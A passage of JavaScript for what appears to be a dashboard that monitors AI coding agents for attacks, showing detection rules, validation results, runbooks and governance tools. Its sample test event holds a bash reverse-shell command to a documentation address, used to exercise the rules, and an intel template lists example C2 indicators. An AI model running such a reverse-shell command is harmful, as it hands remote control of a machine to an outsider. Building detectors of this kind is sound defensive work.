      <td class="mono">${esc(h.last_reported.replace("T", " ").replace("Z", ""))}</td><td>${h.age_min} min</td><td>${h.events}</td>
      <td class="meta">${h.gaps.map(g => `${g.minutes} min (${esc(hms(g.from))}→${esc(hms(g.to))})`).join("<br>") || "–"}</td></tr>`).join("") + `</tbody></table>`;
  $("srcnote").textContent = `As of ${x.as_of} (${x.mode}). Ages are measured against the newest event in the stream, not your wall clock. Silent = no event for ≥ 15 min (3 missed heartbeats).`;
  $("feeds").innerHTML = `<table><thead><tr><th>Control point</th><th>Feed</th><th>Status</th><th>Last reported (UTC)</th><th>Age</th><th>Events</th></tr></thead><tbody>` +
    x.feeds.map(f => `<tr><td>${esc(f.description)}</td><td class="mono">${esc(f.feed)}</td><td>${pill(cls(f.status), f.status)}</td>
      <td class="mono">${esc(f.last_reported.replace("T", " ").replace("Z", ""))}</td><td>${f.age_min} min</td><td>${f.events}</td></tr>`).join("") + `</tbody></table>`;
}

/* ------------------------------------------------------------------ pipeline */
function renderPipeline() {
  const p = S.pipe; if (!p) return;
  renderCoverage();
  const st = p.stages, r = S.stats.responses;
  const kv = (o, n = 5) => Object.entries(o).slice(0, n).map(([k, v]) => `<div><span>${esc(k)}</span><span>${esc(v)}</span></div>`).join("");
  const stage = (n, title, desc, body) => `<div class="stage"><div class="n">${n}</div><b>${esc(title)}</b><p>${esc(desc)}</p><div class="v">${body}</div></div>`;
  $("stages").innerHTML =
    stage(1, "Collect", "Telemetry from IDEs, shell, git, LLM/MCP gateways, egress proxy, package audit and log-shipper heartbeats, sent as NDJSON.", kv({feeds: st.collect.feeds, ...st.collect.by_source}, 5)) +
    stage(2, "Parse & validate", "Each line must be valid JSON with ts, event_type, session_id. Bad lines are rejected and counted; oversized fields are truncated.",
      kv({received: st.parse.lines_received, accepted: st.parse.accepted, "truncated fields": st.parse.truncated_fields, "pipeline errors": st.parse.errors, ...st.parse.rejected})) +
    stage(3, "Normalise & enrich", "Defaults applied, event routed by type, per-session and per-host state built (timelines, heartbeat baselines).",
      kv({sessions: st.normalise.sessions_tracked, hosts: st.normalise.hosts_tracked, unclassified: st.normalise.unclassified})) +
    stage(4, "Detect", `${st.detect.rules} rules evaluated on every non-heartbeat event against the policies on this page.`,
      kv({"events evaluated": st.detect.events_evaluated, ...st.detect.hits}, 8)) +
    stage(5, "Correlate", "Kill-chain logic across a session (injection → action → egress) and silence logic across log sources.",
      kv({"kill chains": st.correlate.kill_chains, "silence alerts": st.correlate.silence_alerts})) +
    stage(6, "Alert & case", "Each detection is a structured, MITRE-mapped alert. Alerts are grouped per session into a case with status, owner and notes.",
      kv({alerts: st.case.alerts, cases: st.case.cases})) +
    stage(7, "Respond", "Policy by severity: webhook, quarantine log, freeze session or isolate host, flag files, block package (all simulated).",
      kv({webhooks: r.webhooks, "sessions frozen": r.sessions_frozen, "host isolations": r.host_isolations, "pkgs blocked": r.packages_blocked}));
  $("rules").innerHTML = p.rules.map(x => `<details><summary><b>${esc(x.id)}</b><span>${esc(x.name)}</span><span class="meta">${x.hits} hit(s)</span></summary>
    <p><b>Detects:</b> ${esc(x.detects)}</p><p><b>Why it matters:</b> ${esc(x.why)}</p><p>${rbBtn(x.id)}</p></details>`).join("");
  const en = S.env;
  if (en) $("envreg").innerHTML = `<p class="meta"><b>${en.unconfirmed}</b> of ${en.entries.length} entries are still <i>assumed</i>. Each needs its owner to confirm it; until then false positives and misses are expected. Edit <code>${esc(en.file)}</code> by pull request.</p>
    <table class="tbl"><tr><th>Fact</th><th>Kind</th><th>Used by</th><th>Owner</th><th>Status</th><th>Review by</th><th>Items</th></tr>${en.entries.map(x =>
      `<tr title="${esc(x.why)}"><td class="mono">${esc(x.key)}</td><td>${kindPill(x.kind)}</td><td class="meta">${usedBy(x)}</td><td>${esc(x.owner)}</td><td>${pill(x.status === "confirmed" ? "ok" : "delayed", x.status)}</td><td>${expPill(x)}</td><td>${esc(x.count)}</td></tr>`).join("")}</table>`;
  $("policies").innerHTML = `<div class="pol">` + Object.entries(p.policies).map(([k, v]) => `<h5>${esc(k)}</h5><div>${v.map(i => `<span class="tag">${esc(i)}</span>`).join("")}</div>`).join("") + `</div>`;
  const rs = S.resp; if (!rs) return;
  const tabs = [["quarantine_log", "Quarantine log"], ["webhook_received", "Webhook"], ["flagged_files", "Flagged files"], ["package_blocklist", "Pkg blocklist"]];
  $("logtabs").innerHTML = tabs.map(([k, l]) => `<span class="chip ${S.logTab === k ? "on" : ""}" data-a="logtab" data-k="${k}">${l} ${rs[k].length}</span>`).join("");
  $("log").innerHTML = rs[S.logTab].length ? `<pre>${rs[S.logTab].map(esc).join("\n")}</pre>` : `<div class="empty">empty</div>`;
}


/* ------------------------------------------------------------------ detection logic */
const TEST_SAMPLE = '{"ts":"2026-10-23T10:55:50Z","source":"shell_audit","session_id":"demo-1","user":"dev.one","host":"dev-laptop-09","repo":"nb-risk-engine","agent":"nb-codeagent","agent_type":"coding_agent","event_type":"shell_command","data":{"command":"bash -i >& /dev/tcp/203.0.113.7/4444 0>&1","cwd":"/work/x","exit_code":0,"approved_by":"auto"},"event_id":"t1"}';
const ENG_CLASS = {pattern: "e-pat", stateful: "e-sta", baseline: "e-bas", provenance: "e-pro"};
function renderLogic() {
  const R = S.rules; if (!R) return;
  $("logic-intro").innerHTML = `<p class="brief"><b>${esc(R.summary)}</b></p>
    <div class="engs">${Object.entries(R.engine_types).map(([k, v]) => `<div class="eng ${ENG_CLASS[k]}"><b>${esc(v)}</b></div>`).join("")}</div>
    <p class="meta mt">Where it is defined: rule code in <code>app/detectors.py</code> and <code>app/engine.py</code>; the policy values it enforces (approved LLM endpoints, protected branches, allowed egress, agent config files, thresholds) in <code>app/config.py</code>; this documentation in <code>app/catalog.py</code>. Every rule is verified by a labelled scenario in the sample data and a unit test.</p>
    <p class="meta"><b>Who can change it:</b> ${esc(R.ownership)}</p>`;
  if (!$("logic-rules").dataset.built || $("logic-rules").dataset.n !== String(R.rules.length)) {
    $("logic-rules").dataset.built = "1"; $("logic-rules").dataset.n = String(R.rules.length);
    $("logic-rules").innerHTML = R.rules.map(r => `<details class="rule" data-id="${esc(r.id)}"><summary><span class="rid">${esc(r.id)}</span><b>${esc(r.name)}</b>
      <span class="eng-pill ${ENG_CLASS[r.engine_key]}">${esc(r.engine.split(" · ")[0])}</span><span class="meta rhits" data-hits="${esc(r.id)}"></span></summary>
      <div class="rbody"><div class="meta">${esc(r.engine)} · scope: ${esc(r.scope)}</div>
      <h5>Inputs</h5>${list(r.inputs)}<h5>Logic, step by step</h5><ol>${r.steps.map(x => `<li>${esc(x)}</li>`).join("")}</ol>
      <div><b>Severity:</b> ${esc(r.severity)}</div>${r.limits ? `<div class="meta mt"><b>Known limit:</b> ${esc(r.limits)}</div>` : ""}
      <h5>Live parameters (from config)</h5>${Object.entries(r.params).map(([k, v]) => `<div class="par"><span>${esc(k)}</span><span>${v.map(x => `<span class="chip">${esc(x)}</span>`).join("")}</span></div>`).join("")}
      <h5>MITRE</h5>${r.techniques.map(t => `<span class="chip">${esc(t)}</span>`).join("")}
      <h5>Response policy</h5>${list(r.response)}<h5>Human decisions it raises</h5>${list(r.decisions)}
      <div class="mt">${rbBtn(r.id)}</div><div class="meta mt">Defined in <code>${esc(r.defined_in)}</code> · verified by ${esc(r.verified_by)}</div></div></details>`).join("");
  }
  R.rules.forEach(r => { const el = document.querySelector(`[data-hits="${r.id}"]`); if (el) el.textContent = `${r.hits} alert(s)` + (r.tp + r.fp ? ` · analyst verdicts: ${r.tp} true / ${r.fp} false positive` : ""); });
  $("caps").innerHTML = R.capabilities.map(c => `<div class="cap"><span class="cs ${esc(c.status)}">${esc(c.status)}</span><div><b>${esc(c.name)}</b><div class="meta">${esc(c.note)}</div></div></div>`).join("");
  if (!$("tester-in").value) $("tester-in").value = TEST_SAMPLE;
  renderValidation();
}
function renderValidation() {
  const v = S.val; if (!v) return;
  const t = v.totals, rows = Object.entries(v.per_rule);
  $("valid").innerHTML = `<p class="brief"><b>${t.detected}/${t.attacks}</b> attack variants raised a case · <b>${t.false_alarms}/${t.benign}</b> routine developer look-alikes opened a case · ${t.signals} stored as low signals (no page) · ${t.passed}/${t.cases} cases pass.</p>
    <table class="tbl"><tr><th>Rule</th><th>Attack variants caught</th><th>Look-alikes</th><th>False alarms</th><th>Low signals</th></tr>${rows.map(([k, p]) =>
      `<tr><td><b>${esc(k)}</b></td><td class="${p.detected < p.attacks ? "c-crit" : ""}">${p.detected}/${p.attacks}</td><td>${p.benign}</td><td class="${p.false_alarms ? "c-crit" : ""}">${p.false_alarms}</td><td>${p.signals}</td></tr>`).join("")}</table>
    ${v.heldout ? `<p class="brief mt"><b>Held-out set</b> (written after the rules by a reviewer trying to get round them): <b>${v.heldout.detected}/${v.heldout.attacks}</b> attacks raised a case, <b>${v.heldout.false_alarms}/${v.heldout.benign}</b> look-alikes did. <b>First pass, before the fixes: ${v.heldout.first_pass.detected}/${v.heldout.first_pass.attacks}.</b> It is now a regression set, so today's number is not independent. Accepted gaps: ${v.heldout.misses.map(m => esc(m.title)).join("; ") || "none"}.</p>` : ""}
    ${v.failures.length ? `<p class="c-crit">Failing: ${v.failures.map(f => esc(f.id + " " + f.title)).join("; ")}</p>` : ""}
    <details class="mt"><summary class="meta">All ${t.cases} labelled cases</summary><table class="tbl"><tr><th>ID</th><th>Case</th><th>Expected</th><th>Result</th></tr>${v.cases.map(c =>
      `<tr><td class="mono">${esc(c.id)}</td><td>${c.attack ? "⚔ " : "✓ "}${esc(c.title)}</td><td class="meta">${esc(c.expected)}</td><td class="${c.pass ? "c-ok" : "c-crit"}">${c.pass ? "pass" : "FAIL: " + esc(c.got)}</td></tr>`).join("")}</table></details>`;
}
async function runTest() {
  const out = $("tester-out"); out.textContent = "Running…";
  try {
    const r = await api("/api/test-event", {method: "POST", body: $("tester-in").value});
    out.innerHTML = `<p class="meta">${r.events_accepted} event(s) accepted${r.rejected ? `, ${r.rejected} rejected (check the JSON and required fields)` : ""}.</p>` +
      (r.alerts.length ? r.alerts.map(a => `<div class="hyp supported"><div>${sevPill(a.severity)} <b>${esc(a.rule_id)}</b> ${esc(a.title)}</div>
        <div class="meta">Why: ${esc(a.signals.join(" · ") || "see evidence")}</div><pre>${esc(a.snippet)}</pre><div class="meta">MITRE ${esc(a.mitre.join(", "))}</div></div>`).join("")
        : `<div class="empty">No rule fired for these events.</div>`);
  } catch (e) { out.textContent = "Test failed: " + e.message; }
}

/* ------------------------------------------------------------------ events */
/* ------------------------------------------------------------------ runbooks */
// Small, safe Markdown subset: ## headings, - bullets, 1. lists, **bold**, *italic*, `code`. Text is escaped first.
const inl = t => esc(t).replace(/`([^`]+)`/g, "<code>$1</code>").replace(/\*\*([^*]+)\*\*/g, "<b>$1</b>").replace(/\*([^*]+)\*/g, "<i>$1</i>");
function md(src) {
  const out = []; let open = null;
  const close = () => { if (open) { out.push(`</${open}>`); open = null; } };
  for (const line of src.split("\n")) {
    let m;
    if ((m = line.match(/^## (.+)/))) { close(); out.push(`<h4>${inl(m[1])}</h4>`); }
    else if ((m = line.match(/^- (.+)/))) { if (open !== "ul") { close(); out.push("<ul>"); open = "ul"; } out.push(`<li>${inl(m[1])}</li>`); }
    else if ((m = line.match(/^\d+\. (.+)/))) { if (open !== "ol") { close(); out.push("<ol>"); open = "ol"; } out.push(`<li>${inl(m[1])}</li>`); }
    else if (line.trim()) { close(); out.push(`<p>${inl(line)}</p>`); }
  }
  close(); return out.join("");
}
function renderRunbooks() {
  const idx = S.rb || [];
  $("rb-index").innerHTML = idx.map(r => `<a href="#rb=${esc(r.id)}" class="rbi ${S.rbsel === r.id ? "on" : ""}" data-a="openrb" data-id="${esc(r.id)}"><b>${esc(r.id)}</b> <span>${esc(r.title)}</span></a>`).join("");
  const d = S.rbdoc; if (!d || d.id !== S.rbsel) return;
  const key = JSON.stringify(d) + (S.env ? "" : "");
  if ($("rb-doc").dataset.key === key) return;
  $("rb-doc").dataset.key = key;
  const g = d.generated;
  const rules = g.rules.map(r => `<details open><summary><b>${esc(r.id)}</b> ${esc(r.name)} <span class="meta">· severity: ${esc(r.severity)}</span></summary>
      <p><b>Detects:</b> ${esc(r.detects)}</p><p><b>Why it matters:</b> ${esc(r.why)}</p>
      <h5>Triage questions</h5>${list(r.triage)}<h5>Containment</h5>${list(r.contain)}
      <h5>Human decisions it raises</h5>${r.decisions.length ? `<ul>${r.decisions.map(x => `<li>${esc(x.action)} <span class="meta">· owner ${esc(x.owner)} · ${esc(x.why)}</span></li>`).join("")}</ul>` : '<div class="meta">none</div>'}
      <h5>Automatic response</h5>${list(r.response)}<h5>MITRE</h5>${r.techniques.map(t => `<span class="chip">${esc(t)}</span>`).join("")}
      <div class="meta mt">Verified by ${esc(r.verified_by)}</div></details>`).join("");
  const reg = g.register.length ? `<table class="tbl"><tr><th>Register entry</th><th>Status</th><th>Owner</th><th>Current values</th></tr>${g.register.map(x =>
    `<tr title="${esc(x.why)}"><td class="mono">${esc(x.key)}</td><td>${pill(x.status === "confirmed" ? "ok" : "delayed", x.status)}</td><td>${esc(x.owner)}</td>
     <td>${x.items.map(i => `<span class="chip">${esc(i)}</span>`).join("")}${x.more ? ` <span class="meta">+${x.more} more</span>` : ""}</td></tr>`).join("")}</table>
    <p class="meta">An <i>assumed</i> entry is a guess until its owner confirms it. To change a value, propose it in <a href="#" data-a="tab" data-tab="gov">Governance &amp; audit</a>.</p>` : `<div class="meta">This runbook depends on no register entry.</div>`;
  $("rb-doc").innerHTML = `<h3>${esc(d.id)} · ${esc(d.title)}</h3><div class="meta">Applies to: ${esc(d.scope)} · owner: ${esc(d.owner)} · version ${esc(d.version)}</div>
    ${md(d.body)}<hr><h3>Reference, generated from the live SIEM</h3><p class="meta">Built from the rule catalog and the register at this moment, so it cannot drift from what the rule does.</p>${rules}
    <h4>Register entries this runbook depends on</h4>${reg}`;
}
function openRb(id) { S.rbsel = id; S.rbdoc = null; S.tab = "runbooks"; try { history.replaceState(null, "", "#rb=" + id); } catch (e) {} load(); }
function setTab(t) { S.tab = t; if (t === "runbooks" && !S.rbsel) S.rbsel = "RB-00"; load(); }
function renderGov() {
  const en = S.env; if (!en) return;
  $("gov-entries").innerHTML = `<p class="meta"><b>${en.unconfirmed}</b> of ${en.entries.length} entries are still <i>assumed</i> (owner has not confirmed them). <b>${en.review.expired}</b> are past their review-by date, ${en.review.due_soon} are due within 14 days. ${esc(en.review.rule)}</p>
    <table class="tbl"><tr><th>Entry</th><th>Kind</th><th>Used by</th><th>Owner</th><th>Status</th><th>Review by</th><th>Items</th><th>Pending</th></tr>${en.entries.map(x =>
      `<tr title="${esc(x.why)}"><td class="mono">${esc(x.key)}</td><td>${kindPill(x.kind)}</td><td class="meta">${usedBy(x)}</td><td>${esc(x.owner)}</td><td>${pill(x.status === "confirmed" ? "ok" : "delayed", x.status)}</td><td>${expPill(x)}</td>
       <td>${esc(x.items.length)} <span class="meta">${esc(cut(x.items.slice(0, 3).join(", "), 60))}${x.items.length > 3 ? " …" : ""}</span></td><td>${x.pending || "–"}</td></tr>`).join("")}</table>`;
  const pf = S.prefill || {};
  const f = $("gov-form");
  if (!f.dataset.built) {
    f.dataset.built = "1";
    f.innerHTML = `<div class="gform"><label>Entry</label><select id="pf-key">${en.entries.map(x => `<option>${esc(x.key)}</option>`).join("")}</select>
      <label>Change</label><select id="pf-op"><option value="add">add item</option><option value="remove">remove item</option><option value="set">set single value</option><option value="confirm">confirm entry (owner verified it)</option></select>
      <div class="gfull">${privBanner(true)}</div>
      <label>Value</label><input id="pf-val" type="text" maxlength="200" placeholder="e.g. get.corp-tools.example or 203.0.113.0/24">
      <label>Reason</label><textarea id="pf-reason" maxlength="300" placeholder="What did the rule not know? Evidence, ticket, who confirmed it."></textarea>
      <label>From case</label><input id="pf-case" type="text" maxlength="20" placeholder="optional, e.g. C-004"></div>
      <div class="mt"><button class="primary" data-a="submitprop">Submit for approval</button> <span id="pf-msg" class="meta"></span></div>`;
  }
  if (pf.case) { $("pf-case").value = pf.case; $("pf-reason").focus(); S.prefill = null; }
  const me = ident();
  if (!$("gov-props").contains(document.activeElement)) $("gov-props").innerHTML = en.proposals.length ? en.proposals.map(p => `<div class="prop ${esc(p.status)}"><div><b>${esc(p.id)}</b> ${esc(p.op)} <span class="mono">${esc(p.key)}</span> ${p.value ? "· <span class='mono'>" + esc(p.value) + "</span>" : ""} ${pill(p.status === "approved" ? "ok" : p.status === "rejected" ? "silent" : "delayed", p.status)}</div>
      <div class="meta">Reason: ${esc(p.reason)}${p.case_id ? " · case " + esc(p.case_id) : ""}</div>
      <div class="meta">Maker: ${esc(p.maker)} (${esc(p.maker_role)}) at ${esc(hms(p.ts))}Z${p.checker ? ` · Checker: ${esc(p.checker)} (${esc(p.checker_role)}) at ${esc(hms(p.decided))}Z${p.decision_note ? " · " + esc(p.decision_note) : ""}` : ""}</div>
      ${p.status === "pending" ? `<div class="r"><input type="text" maxlength="300" placeholder="checker note" class="pn" data-pid="${esc(p.id)}">
        <button class="primary" data-a="decideprop" data-pid="${esc(p.id)}" data-v="approve">Approve as ${esc(me.n || "…")} (${esc(me.r)})</button>
        <button data-a="decideprop" data-pid="${esc(p.id)}" data-v="reject">Reject</button></div>` : ""}</div>`).join("") : `<div class="empty">No proposals yet.</div>`;
  const a = S.aud;
  if (a) $("aud").innerHTML = `<p class="meta">${a.total} records · head <span class="mono">${esc(a.head.slice(0, 16))}…</span> · file <code>${esc(a.file)}</code></p>
    <table class="tbl"><tr><th>#</th><th>Time (UTC)</th><th>Actor</th><th>Action</th><th>Target</th><th>Result</th><th>Detail</th></tr>${a.records.map(r =>
      `<tr><td>${r.seq}</td><td class="mono">${esc(r.ts.slice(5, 19).replace("T", " "))}</td><td>${esc(r.actor)}${r.role ? ` <span class="meta">${esc(r.role)}</span>` : ""}</td><td>${esc(r.action)}</td><td class="mono">${esc(r.target)}</td>
       <td class="${r.outcome === "ok" ? "" : "c-crit"}">${esc(r.outcome)}</td><td class="meta">${esc(cut(JSON.stringify(r.detail), 90))}</td></tr>`).join("")}</table>`;
}
async function submitProp() {
  const body = {key: $("pf-key").value, op: $("pf-op").value, value: $("pf-val").value.trim() || null, reason: $("pf-reason").value.trim(), case_id: $("pf-case").value.trim() || null};
  try { await api("/api/environment/proposals", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(body)}); $("pf-msg").textContent = "Submitted. A different, more senior person must approve it."; $("pf-val").value = ""; $("pf-reason").value = ""; load(); }
  catch (e) { $("pf-msg").innerHTML = `<span class="err">${esc(e.message)}</span>`; }
}
async function decideProp(pid, v) {
  const note = document.querySelector(`input.pn[data-pid="${pid}"]`)?.value || null;
  if (document.activeElement) document.activeElement.blur();            // lets the proposals list re-render with the new status
  try { await api(`/api/environment/proposals/${pid}/decision`, {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({decision: v, note})}); }
  catch (e) { alert_("Refused: " + e.message); }
  load();
}
function alert_(m) { $("aud-verify").innerHTML = `<span class="err">${esc(m)}</span>`; }
async function verifyAudit() {
  const v = await api("/api/audit/verify");
  $("aud-verify").innerHTML = v.ok ? `<span class="c-ok">✔ chain intact · ${v.records} records</span>` : `<span class="err">✖ broken at record ${esc(v.broken_at)}: ${esc(v.reason)}</span>`;
}
document.addEventListener("input", e => {
  if (e.target.id === "actor") { try { localStorage.setItem("actor", e.target.value.trim()); } catch (x) {} if (S.tab === "gov") renderGov(); }
  if (e.target.id === "aud-q") { S.audq = e.target.value; load(); }
});
document.addEventListener("change", e => { if (e.target.id === "role") { try { localStorage.setItem("role", e.target.value); } catch (x) {} if (S.tab === "gov") renderGov(); } });
(() => { const {n, r} = ident(); $("actor").value = n; $("role").value = r; })();
api("/api/whoami").then(w => { S.me = w; if (w.from_sso) { $("actor").hidden = true; $("role").hidden = true; $("whoami").textContent = `Signed in as ${w.actor} (${w.role}) via SSO`; } }).catch(() => {});


/* ------------------------------------------------------------------ intel context and AI second opinion on a case */
const KIND_PILL = {threat: "silent", network: "st", asset: "st", identity: "st", benign: "ok"};
function ctxLine(m) {
  const bits = [m.address, m.os, [m.zone, m.environment].filter(Boolean).join(" / "), m.service, m.data_class ? "holds " + m.data_class : "", m.department].filter(Boolean);
  return bits.length ? `<div class="meta">${bits.map(esc).join(" · ")}</div>` : "";
}
function intelBlock(c) {
  const x = c.intel; if (!x) return `<div class="meta">Intel list not loaded.</div>`;
  if (!x.matches.length) return `<div class="meta">No row of the intel list matches this case's user, host, addresses or domains. <i>Enrichment only: it never changes an alert.</i></div>`;
  return `<table class="tbl"><tr><th>Kind</th><th>On</th><th>Matched</th><th>Label</th><th>Source · confidence</th><th>Owner</th><th>Note</th></tr>${x.matches.map(m =>
    `<tr><td>${pill(KIND_PILL[m.kind] || "st", m.kind)}</td><td>${esc(m.on)}</td><td class="mono">${esc(cut(m.matched, 40))}${m.times > 1 ? ` <span class="meta">×${esc(m.times)}</span>` : ""}</td><td>${esc(m.tag)}${m.criticality ? ` <span class="meta">(${esc(m.criticality)})</span>` : ""}${ctxLine(m)}</td>
     <td class="meta">${esc(m.source)}${m.confidence ? " · " + esc(m.confidence) : ""}</td><td>${esc(m.owner || "–")}</td><td class="meta">${esc(cut(m.note, 80))}</td></tr>`).join("")}</table>
    <div class="meta mt">Enrichment only: a match adds context, it never fires, suppresses or re-prioritises an alert.</div>`;
}
function aiBlock(c) {
  const st = S.ai, rv = c.ai_reviews || [];
  let head;
  if (!st || st.mode === "off") head = `<div class="meta">Off. The rules and the case briefing above are the whole analysis. An optional second opinion can be enabled (AI_MODE) behind the bank's approved LLM gateway; it only advises.</div>`;
  else if (!st.ready) head = `<div class="meta c-high">Not ready: ${esc(st.problems.join("; "))}</div>`;
  else head = `<div class="r"><button data-a="aireview" data-case="${esc(c.case_id)}">Ask for a second opinion (${esc(st.mode)}, ${esc(st.provider)})</button><button data-a="aikill" title="Switch the assistant off until restart">Kill switch</button> <span id="ai-msg" class="meta"></span></div>
    <div class="meta">${esc(st.label)}</div>`;
  const body = rv.slice().reverse().map(r => `<div class="aiopinion"><div>${pill(r.verdict === "likely_true_positive" ? "silent" : r.verdict === "likely_false_positive" ? "ok" : "delayed", r.verdict.replace(/_/g, " "))} <span class="meta">confidence ${esc(r.confidence)} · ${r.agrees_with_rules ? "agrees with the rules" : "differs from the rules: a person should look"} · ${esc(r.provider)}/${esc(r.model)} via ${esc(r.endpoint_host)} · asked by ${esc(r.by)} at ${esc(hms(r.ts))}Z</span></div>
    <p class="brief">${esc(r.rationale)}</p>${r.next_steps.length ? list(r.next_steps) : ""}${r.proposed_actions.length ? `<div class="meta">Suggested decisions (still need a named person to approve): ${r.proposed_actions.map(esc).join(", ")}</div>` : ""}
    ${r.evidence_gaps.length ? `<div class="meta">Gaps it names: ${r.evidence_gaps.map(esc).join(" · ")}</div>` : ""}
    <div class="meta">Dropped by the output check: ${esc(JSON.stringify(r.dropped))} · input hash ${esc(r.input_sha256)}</div></div>`).join("");
  const pol = st ? `<div class="meta mt"><b>Data policy: ${esc(st.data_policy)}</b> (${esc(st.endpoint_scope)}). ${esc(st.data_policy_text)} <span class="meta">Set at deploy time (AI_DATA_POLICY), not here.</span></div>` : "";
  const prev = `<div class="r"><button data-a="aipreview" data-case="${esc(c.case_id)}">Preview what the AI would receive</button> <span class="meta">nothing is sent</span></div><div id="ai-preview"></div>`;
  return head + pol + prev + body;
}

/* ------------------------------------------------------------------ coverage */
const SCOPE_PILL = {covered: "ok", "out of scope": "idle", gap: "delayed"};
function renderCoverage() {
  const v = S.cov; if (!v || !$("cov")) return;
  const t = v.totals;
  $("cov").innerHTML = `<p class="brief"><b>${t.attack_techniques}</b> ATT&amp;CK and <b>${t.atlas_techniques}</b> ATLAS techniques are mapped by ${t.rules} rules. ${t.tactics_covered} of ${t.tactics_total} ATT&amp;CK tactics have a mapped technique, ${t.tactics_out_of_scope} are out of scope on purpose (the reason is shown) and ${t.tactics_gap} have none: those are gaps.</p>
    <div class="covgrid">${v.matrix.map(m => `<div class="cov ${esc(m.scope.replace(/ /g, "-"))}"><div class="ch"><b>${esc(m.tactic)}</b> ${pill(SCOPE_PILL[m.scope], m.scope)}</div>
      ${m.techniques.map(x => `<div class="tech"><a class="tag attack" href="${esc(x.url)}" target="_blank" rel="noopener noreferrer">${esc(x.id)}</a> ${esc(x.name.split(": ").pop())}<div class="meta">rules ${esc(x.rules.join(", "))} · ${x.validated ? `✔ ${esc(x.attack_cases)} corpus attacks caught` : "no corpus evidence"}</div></div>`).join("")}
      ${m.note ? `<div class="meta">${esc(m.note)}</div>` : ""}${!m.techniques.length && !m.note ? `<div class="meta">No rule maps here.</div>` : ""}</div>`).join("")}</div>
    <h5>ATLAS (AI-specific techniques)</h5><div>${v.atlas.map(a => `<div class="meta"><b>${esc(a.tactic)}</b>: ${a.techniques.map(x => `<a class="tag atlas" href="${esc(x.url)}" target="_blank" rel="noopener noreferrer" title="rules ${esc(x.rules.join(", "))}">${esc(x.id)} · ${esc(x.name)}</a>`).join(" ")}</div>`).join("")}</div>
    <p class="meta">${esc(v.caveat)}</p>`;
}

/* ------------------------------------------------------------------ intel list tab */
const TEMPLATE = "type,value,kind,tag,source,confidence,owner,criticality,expires,note,zone,environment,address,os,service,data_class,department\nip,203.0.113.9,threat,Example C2,my feed,high,,high,2027-12-31,example row,,,,,,,\ndomain,bad.example.net,threat,Phishing,my feed,medium,,medium,,sub-domains match too,,,,,,,\ncidr,10.60.0.0/16,network,Payments VPC,IPAM,high,Cloud platform,critical,,example network zone,Payments,prod,,,,,\nhost,build-agent-09,asset,Build agent,CMDB,high,Platform engineering,high,,example asset,Build,prod,10.60.2.9,Ubuntu 22.04,CI/CD pipeline,deploy secrets,Platform engineering\nuser,jane.doe,identity,Engineer,HR export,high,Engineering,medium,,example user,,,,,,,Engineering\n";
function renderIntel() {
  const f = $("intel-form");
  if (!f.dataset.built) {
    f.dataset.built = "1";
    f.innerHTML = `<textarea id="intel-in" rows="7" spellcheck="false" placeholder="type,value,kind,tag,source,confidence,owner,criticality,expires,note,zone,environment,address,os,service,data_class,department"></textarea>
      <div class="r"><input id="intel-file" type="file" accept=".csv,.json,.txt" aria-label="Choose a CSV or JSON file"><input id="intel-label" type="text" maxlength="60" placeholder="list name (optional)"></div>
      <div class="r"><button class="primary" data-a="intelupload">Upload</button><button data-a="inteltemplate">Show template</button><button data-a="intelhunt">Retro-hunt</button><span id="intel-msg" class="meta"></span></div>
      <p class="meta">Types: ip, cidr, domain, host, user. Kinds: threat, network, asset, identity, benign. Optional context columns: zone, environment, address, os, service, data_class, department. A domain row also matches its sub-domains; a cidr row matches every address inside it. Up to ${S.intel ? esc(S.intel.max_rows) : 5000} rows per upload.</p>`;
  }
  const x = S.intel; if (!x) return;
  const CATS = {all: "All", threat: "Threat intel (IOC)", network: "Networks", asset: "Assets (CMDB)", identity: "Identities (IAM / HR)", benign: "Known good"};
  const rows = x.entries.filter(e => S.intelKind === "all" || e.kind === S.intelKind);
  const COLS = {
    threat: [["Type", e => e.type], ["Indicator", e => e.value, "mono"], ["What it is", e => e.tag], ["Source", e => e.source, "meta"], ["Conf.", e => e.confidence], ["Expires", "exp"], ["Note", e => e.note, "meta"]],
    network: [["Range", e => e.value, "mono"], ["Network", e => e.tag], ["Zone", e => e.zone], ["Env.", e => e.environment], ["Owner", e => e.owner], ["Source", e => e.source, "meta"], ["Note", e => e.note, "meta"]],
    asset: [["Host", e => e.value, "mono"], ["Address", e => e.address, "mono"], ["What it is", e => e.tag], ["OS", e => e.os, "meta"], ["Zone · env.", e => [e.zone, e.environment].filter(Boolean).join(" · ")], ["Service", e => e.service], ["Holds", e => e.data_class], ["Crit.", e => e.criticality], ["Owner", e => e.owner]],
    identity: [["User", e => e.value, "mono"], ["Role", e => e.tag], ["Department", e => e.department], ["Crit.", e => e.criticality], ["Owner", e => e.owner], ["Source", e => e.source, "meta"], ["Note", e => e.note, "meta"]],
    benign: [["Type", e => e.type], ["Value", e => e.value, "mono"], ["What it is", e => e.tag], ["Source", e => e.source, "meta"], ["Conf.", e => e.confidence], ["Expires", "exp"], ["Note", e => e.note, "meta"]],
    all: [["Kind", "kind"], ["Type", e => e.type], ["Value", e => e.value, "mono"], ["What it is", e => e.tag], ["Source", e => e.source, "meta"], ["Owner", e => e.owner], ["Crit.", e => e.criticality], ["Expires", "exp"]],
  }[S.intelKind] || [];
  const cell = (c, e) => c[1] === "exp" ? (e.state === "expired" ? pill("delayed", "expired " + e.expires) : esc(e.expires || "–")) : c[1] === "kind" ? pill(KIND_PILL[e.kind] || "st", e.kind) : esc(c[1](e) || "–");
  const table = (cols, list) => `<div class="scroll"><table class="tbl intel">${`<tr>${cols.map(c => `<th>${esc(c[0])}</th>`).join("")}<th></th></tr>`}${list.map(e => `<tr class="${e.state === "expired" ? "expired" : ""}">${cols.map(c => `<td class="${c[2] || ""}${c[2] === "mono" ? " nowrap" : ""}">${cell(c, e)}</td>`).join("")}<td><button data-a="inteldel" data-id="${esc(e.id)}" title="Remove this row">✕</button></td></tr>`).join("") || `<tr><td colspan="${cols.length + 1}" class="meta">No rows of this kind.</td></tr>`}</table></div>`;
  $("intel-rows").innerHTML = `<div class="chips">${Object.entries(CATS).map(([k, label]) => `<span class="chip ${S.intelKind === k ? "on" : ""}" data-a="intelkind" data-k="${k}">${esc(label)} ${k === "all" ? x.total : (x.counts[k] ?? 0)}</span>`).join("")}${x.expired ? pill("delayed", x.expired + " expired") : ""}</div>
    ${table(COLS, rows)}
    <p class="meta">${x.rules.map(esc).join(" ")}</p>`;
